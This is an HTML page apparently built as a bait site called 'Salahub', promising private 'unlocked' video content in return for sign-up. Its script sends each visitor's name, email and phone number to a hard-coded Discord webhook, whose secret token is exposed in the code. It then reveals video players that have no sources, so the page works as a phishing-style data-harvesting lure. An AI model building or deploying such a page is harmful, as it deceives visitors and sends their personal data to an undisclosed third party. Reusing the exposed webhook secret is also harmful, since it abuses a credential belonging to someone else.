<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Salahub</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Poppins', sans-serif;
}

body {
    background: #050505;
    color: white;
    overflow: hidden;
}

/* BACKGROUND GLOW */
.bg-glow {
    position: fixed;
    width: 600px;
    height: 600px;
    background: radial-gradient(circle, rgba(255,0,0,0.4), transparent 70%);
    top: -100px;
    left: -100px;
    filter: blur(120px);
}

/* CENTER CARD */
.container {
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
}

.card {
    background: rgba(255,255,255,0.03);
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255,0,0,0.2);
    padding: 40px;
    border-radius: 20px;
    width: 350px;
    text-align: center;
    animation: fadeIn 1s ease;
}

/* TITLE */
h1 {
    margin-bottom: 10px;
    color: #ff1a1a;
    letter-spacing: 2px;
}

p {
    opacity: 0.6;
    margin-bottom: 20px;
}

/* INPUT */
.input-group {
    position: relative;
    margin-bottom: 20px;
}

input {
    width: 100%;
    padding: 12px;
    background: transparent;
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: 10px;
    color: white;
    outline: none;
}

input:focus {
    border-color: red;
    box-shadow: 0 0 10px rgba(255,0,0,0.5);
}

/* BUTTON */
button {
    width: 100%;
    padding: 12px;
    border: none;
    border-radius: 10px;
    background: linear-gradient(135deg, #ff0000, #660000);
    color: white;
    font-weight: bold;
    cursor: pointer;
    transition: 0.3s;
}

button:hover {
    transform: translateY(-2px);
    box-shadow: 0 10px 20px rgba(255,0,0,0.4);
}

/* VIDEOS */
.videos {
    display: none;
    height: 100vh;
    padding: 40px;
    animation: fadeIn 1s ease;
}

.grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px,1fr));
    gap: 20px;
}

.video-card {
    border-radius: 15px;
    overflow: hidden;
    background: #111;
    transition: 0.3s;
}

.video-card:hover {
    transform: scale(1.03);
}

video {
    width: 100%;
}

/* ANIMATION */
@keyframes fadeIn {
    from {opacity: 0; transform: translateY(20px);}
    to {opacity: 1; transform: translateY(0);}
}
</style>
</head>

<body>

<div class="bg-glow"></div>

<div class="container" id="formBox">
    <div class="card">
        <h1>SALAHUB</h1>
        <p>Accès privé sécurisé</p>

        <form id="form">
            <div class="input-group">
                <input type="text" id="nom" placeholder="Nom" required>
            </div>

            <div class="input-group">
                <input type="text" id="prenom" placeholder="Prénom" required>
            </div>

            <div class="input-group">
                <input type="email" id="email" placeholder="Email" required>
            </div>

            <div class="input-group">
                <input type="tel" id="telephone" placeholder="Téléphone" required>
            </div>

            <button>S'INSCRIRE</button>
        </form>
    </div>
</div>

<div class="videos" id="videos">
    <h2>Contenu débloqué</h2>

    <div class="grid">
        <div class="video-card"><video controls></video></div>
        <div class="video-card"><video controls></video></div>
        <div class="video-card"><video controls></video></div>
    </div>
</div>

<script>
const webhookURL = "https://discord.com/api/webhooks/1487734707847172167/a0c6N1lRRQiAnem-7t00vA8X7abG7ghfAJZ33Vvyk3yURpgK8j9nvZwgxe35k0sUTneY";

document.getElementById("form").addEventListener("submit", function(e) {
    e.preventDefault();

    const nom = document.getElementById("nom").value;
    const prenom = document.getElementById("prenom").value;
    const email = document.getElementById("email").value;
    const telephone = document.getElementById("telephone").value;

    const data = {
        content: `Salahub
Nom: ${nom}
Prénom: ${prenom}
Email: ${email}
Téléphone: ${telephone}`
    };

    fetch(webhookURL, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data)
    })
    .then(res => {
        if (res.ok) {
            document.getElementById("formBox").style.display = "none";
            document.getElementById("videos").style.display = "block";
            document.body.style.overflow = "auto";
        }
    });
});
</script>

</body>
</html>
